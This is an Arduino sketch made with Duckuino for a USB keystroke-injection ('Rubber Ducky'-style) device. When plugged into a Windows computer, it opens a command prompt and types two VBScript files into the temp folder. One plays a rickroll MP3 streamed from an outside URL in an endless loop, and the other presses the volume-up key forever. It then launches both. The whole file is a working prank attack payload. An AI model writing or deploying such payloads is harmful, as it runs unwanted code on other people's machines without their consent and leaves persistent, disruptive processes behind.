/**
 * Made with Duckuino, an open-source project.
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("cmd"));

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("del %tmp%\\rickyou.vbs"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("del %tmp%\\volup.vbs"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("cd %tmp% && copy con rickyou.vbs"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("While true"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Dim oPlayer"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Set oPlayer = CreateObject(\"WMPlayer.OCX\")"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("oPlayer.URL = \"https://pixelcoding.nl/download/rickroll.mp3\""));

  typeKey(KEY_RETURN);

  Keyboard.print(F("oPlayer.controls.play"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("While oPlayer.playState <> 1 ' 1 = Stopped"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("WScript.Sleep 100"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Wend"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("oPlayer.close"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Wend"));

  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print(F("copy con volup.vbs"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("do"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Set WshShell = CreateObject(\"WScript.Shell\")"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("WshShell.SendKeys(chr(&hAF))"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("loop"));

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print(F("start rickyou.vbs && volup.vbs"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}